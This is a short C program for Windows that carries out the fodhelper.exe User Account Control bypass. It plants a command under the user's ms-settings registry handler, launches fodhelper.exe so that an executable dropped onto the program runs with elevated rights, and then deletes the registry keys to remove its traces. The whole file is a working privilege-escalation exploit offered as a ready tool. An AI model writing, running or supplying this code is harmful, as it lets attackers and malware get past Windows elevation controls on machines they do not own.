#include <windows.h>
#include <stdio.h>
#include <shlwapi.h>

#pragma comment(lib, "Shlwapi.lib")

int main(int argc, char* argv[]) {
    #ifdef _WIN64
    printf("[DEBUG] This is a 64-bit build.\n");
    #else
    printf("[DEBUG] This is a 32-bit build.\n");
    #endif

    if (argc != 2 || !PathFileExistsA(argv[1])) {
        printf("Please drag and drop a valid .exe file onto this program.\n");
        goto wait_exit;
    }

    char payload[MAX_PATH + 100];
    sprintf(payload, "cmd.exe /c \"\"%s\"\"", argv[1]); // properly quoted

    HKEY hKey;
    LONG result = RegCreateKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open\\command", &hKey);
    if (result != ERROR_SUCCESS) {
        printf("[-] Failed to create registry key. Error code: %ld\n", result);
        goto wait_exit;
    }

    RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)payload, strlen(payload) + 1);
    RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (BYTE*)"", 1);
    RegCloseKey(hKey);

    printf("[*] Registry trap created. Launching fodhelper.exe...\n");

    // Use Sysnative to bypass WOW64 redirection
    HINSTANCE hRes = ShellExecuteA(NULL, "open", "C:\\Windows\\System32\\fodhelper.exe", NULL, NULL, SW_SHOW);
    if ((INT_PTR)hRes <= 32) {
        printf("[-] Failed to launch fodhelper.exe! Error code: %ld\n", (LONG)(INT_PTR)hRes);
        goto cleanup;
    }

    printf("[*] Waiting a few seconds for payload...\n");
    Sleep(3000);

cleanup:
    printf("[*] Cleaning registry...\n");
    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open\\command");
    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open");
    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell");
    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");

wait_exit:
    printf("\n[+] Done. Press Enter to exit...\n");
    getchar();
    getchar(); // absorb drag&drop newline
    return 0;
}
